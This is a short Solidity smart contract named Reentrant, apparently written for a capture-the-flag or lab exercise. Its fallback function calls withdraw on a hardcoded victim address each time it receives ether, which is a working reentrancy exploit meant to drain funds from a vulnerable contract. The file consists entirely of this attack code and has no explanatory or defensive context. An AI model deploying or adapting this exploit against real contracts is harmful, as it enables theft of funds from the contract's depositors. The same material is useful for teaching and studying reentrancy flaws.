//SDPX-License-Identifier: MIT

pragma solidity 0.6.0;

contract Reentrant {
  address victim = 0x912A7Cd0dD55Ca9Ba228aBFEccb33DC7306748c6;

  fallback() external payable {
    (bool success, ) = victim.call(
      abi.encodeWithSignature("withdraw(uint256)", 0.001 ether)
    );
    require(success, "Could not withdraw");
  }
}